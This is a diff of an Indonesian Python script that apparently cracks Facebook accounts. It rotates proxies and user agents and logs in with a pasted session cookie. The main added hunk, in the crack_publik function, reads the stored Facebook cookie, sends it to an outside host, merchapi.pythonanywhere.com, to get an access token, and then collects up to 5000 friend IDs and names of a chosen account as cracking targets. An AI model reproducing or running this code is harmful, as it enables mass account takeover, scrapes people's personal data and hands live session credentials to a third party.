@@ -4,7 +4,7 @@
 # Developed By  : Dvanmeploph Afriliyan Ferly
 # Recode?, Boleh Asal Cantumkan Nama Author
 # Jangan Ganti Bot Koment Gw
-Decrypt_By   = 'Dvanmeploph Ferly Afriliyan'
+Decompyle_By = 'Dvanmeploph Ferly Afriliyan'
 Author       = 'Rochmat Basuki [ github.com/RozhBasXYZ ]'
 Github       = 'github.com/Dvanmeploph'
 Facebook     = 'Facebook.com/Denventa.Xayonara.Team.UnlimitedARMY'
@@ -634,11 +634,11 @@ def logo():
   |______ |        |      |   
   |______ |_____ __|__    |                            
  Coded By   : {kk}Rochmat Basuki{P}, Version {kk}Premium{P} Limited User
- Updated By : {kk}Dvanmeploph{P}, Github : {kk}Dvanmeploph{P}""")
+ Updated By : {kk}Dvanmeploph{P}, Github : {kk}Dvanmeploph""")
 ###---[ USER BARU ]---###
 def newbie():
 	nama = input(f'{logo()}\n\n [{hh}<{P}] Hai Selamat Datang, Siapa Nama Kamu?\n Nama :{kk} ');open('.nama.json','w').write(nama)
-	input(f' {P}Hallo {kk}{nama}{P}, Ini Adalah Script Premium\n Limited Edition Silahkan Di Gunakan Dan\n Jangan Di Perjual Belikan Ya, Terimakasih\n Silahkan Tekan Enter Untuk Masuk Ke Pilihan Login')
+	input(f' {P}hallo {kk}{nama}{P}, Ini Adalah Script Premium\n Limited Edition Silahkan Di Gunakan Dan\n Jangan Di Perjual Belikan Ya, Terimakasih\n Silahkan Tekan Enter Untuk Masuk Ke Pilihan Login')
 	
 
 ###---[ INFOMASI USER ]---###
@@ -715,8 +715,8 @@ for x in range(1000):
 	if se in redmi:pass
 	else:redmi.append(se)
 abcd = open('.proxy.txt','r').read().splitlines()
-print(' Total New Proxy : '+str(len(abcd)))
-print(' Total Useragent : '+str(len(redmi)))
+print(' total new proxy : '+str(len(abcd)))
+print(' total useragent : '+str(len(redmi)))
 sleep(1)
 	
 	
@@ -759,7 +759,7 @@ def login():
 	if cookie in ['no','No','NO']:
 		open('.menu_login.json','w').write('no');clear_layar();no_login()
 	url = "https://business.facebook.com/business_locations"
-	head = {"user-agent": "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A346B/A346BXXU1AWB9) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
+	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
 	cok = {'cookie':cookie}
 	try:
 		data = ses.get(url,headers=head,cookies=cok)
@@ -768,7 +768,7 @@ def login():
 		open('.cookie.txt','w').write(cookie)
 		open('.token.txt','w').write(token)
 		back()
-	except Exception as e:exit(f" [{M}>{P}] Cookie Invalid")
+	except Exception as e:exit(f" [{M}>{P}] cookie invalid")
 					
 				
 ###---[ MENU NO LOGIN ]---###
@@ -926,21 +926,25 @@ def get_komen(url):
 	
 ###---[ DUMP LOGIN ]---###
 def crack_publik(t,c):
-	akun = input(f' [{hh}<{P}] Pastikan Akun Bersifat Publik \n Akun : ')
-	try:
-		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
-		for pi in bas['friends']['data']:
-			try:
-				try:dump.append(pi['username']+'|'+pi['name'])
-				except:dump.append(pi['id']+'|'+pi['name'])
-				print('\r Sedang Dump %s ID'%(len(dump)),end=" ")
-				sys.stdout.flush()
-				time.sleep(0.0002)
-			except:continue
-		print("\r")
-		atur_atur()
-	except (KeyError,IOError):
-		exit(f" [{M}>{P}] Akun Tidak Publik")	
+    global coki
+    try:coki = open('.cookie.txt', 'r').read()
+    except FileNotFoundError:exit('Cookies Tidak Ditemukan')
+    eaab = ses.get('http://merchapi.pythonanywhere.com/v2/generate_token?type=eaab&cookie='+ coki).json()
+    akun = input(f' [{hh}<{P}] Pastikan Akun Bersifat Publik \n Akun : ')
+    try:
+        bas = ses.get(f'https://graph.facebook.com/{akun}/friends?fields=id,name&limit=5000&access_token={eaab["token"]}',cookies=c).json()
+        for pi in bas['data']:
+            try:
+                try:dump.append(pi['username']+'|'+pi['name'])
+                except:dump.append(pi['id']+'|'+pi['name'])
+                print('Sedang Dump %s ID'%(len(dump)),end="\r")
+                sys.stdout.flush()
+                time.sleep(0.0002)
+            except:continue
+            print("\r")
+        atur_atur()
+    except (KeyError,IOError):
+        exit(f" [{M}>{P}] Akun Tidak Publik")	
 
 
 def crack_masal(t,c):
